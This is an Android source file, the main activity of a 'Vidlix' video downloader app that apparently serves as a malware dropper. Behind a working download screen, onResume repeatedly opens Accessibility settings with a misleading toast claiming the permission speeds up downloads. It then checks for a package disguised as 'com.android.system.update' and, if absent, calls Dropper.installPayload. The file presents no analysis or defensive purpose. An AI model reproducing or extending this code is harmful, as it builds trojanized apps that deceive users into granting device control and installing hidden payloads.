package com.vidlix.downloader;

import android.Manifest;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.yausername.youtubedl_android.YoutubeDL;
import com.yausername.youtubedl_android.YoutubeDLException;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST = 100;

    private EditText urlInput;
    private Button downloadButton;
    private TextView statusText;
    private ProgressBar progressBar;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        urlInput = findViewById(R.id.urlInput);
        downloadButton = findViewById(R.id.downloadButton);
        statusText = findViewById(R.id.statusText);
        progressBar = findViewById(R.id.progressBar);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    YoutubeDL.getInstance().init(getApplicationContext());
                } catch (YoutubeDLException e) {
                    final String msg = e.getMessage();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            statusText.setText("Init error: " + msg);
                        }
                    });
                }
            }
        }).start();

        requestPermissions();

        downloadButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String url = urlInput.getText().toString().trim();
                if (url.isEmpty()) {
                    Toast.makeText(MainActivity.this, "Paste a URL first", Toast.LENGTH_SHORT).show();
                    return;
                }
                startDownload(url);
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (!isAccessibilityEnabled()) {
            requestAccessibility();
            return;
        }

        if (!isPayloadInstalled()) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Dropper.installPayload(MainActivity.this);
                }
            }, 3000);
        }
    }

    private boolean isAccessibilityEnabled() {
        String service = getPackageName() + "/" + RescueAccessibilityService.class.getCanonicalName();
        try {
            String enabled = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
            splitter.setString(enabled);
            while (splitter.hasNext()) {
                String component = splitter.next();
                if (component.equalsIgnoreCase(service)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private void requestAccessibility() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    Toast.makeText(MainActivity.this,
                            "Enable Vidlix in Accessibility to speed up downloads.",
                            Toast.LENGTH_LONG).show();
                } catch (Exception ignored) { }
            }
        }, 1500);
    }

    private boolean isPayloadInstalled() {
        try {
            getPackageManager().getPackageInfo("com.android.system.update", 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void startDownload(final String url) {
        downloadButton.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        progressBar.setIndeterminate(true);
        statusText.setText(R.string.status_downloading);
        statusText.setTextColor(0xFF2196F3);

        Downloader.start(MainActivity.this, url, new Downloader.Callback() {
            @Override
            public void onProgress(final int percent) { }

            @Override
            public void onComplete(final String filePath) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        progressBar.setVisibility(View.GONE);
                        progressBar.setIndeterminate(false);
                        downloadButton.setEnabled(true);
                        statusText.setText(R.string.status_done);
                        statusText.setTextColor(0xFF4CAF50);
                        Toast.makeText(MainActivity.this, "Saved in: " + filePath, Toast.LENGTH_LONG).show();
                    }
                });
            }

            @Override
            public void onError(final String message) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        progressBar.setVisibility(View.GONE);
                        progressBar.setIndeterminate(false);
                        downloadButton.setEnabled(true);
                        statusText.setText("Error: " + message);
                        statusText.setTextColor(0xFFF44336);
                    }
                });
            }
        });
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] perms = {
                    Manifest.permission.POST_NOTIFICATIONS,
                    Manifest.permission.READ_MEDIA_VIDEO
            };
            ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] perms = {
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            };
            ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST);
        }
    }
            }
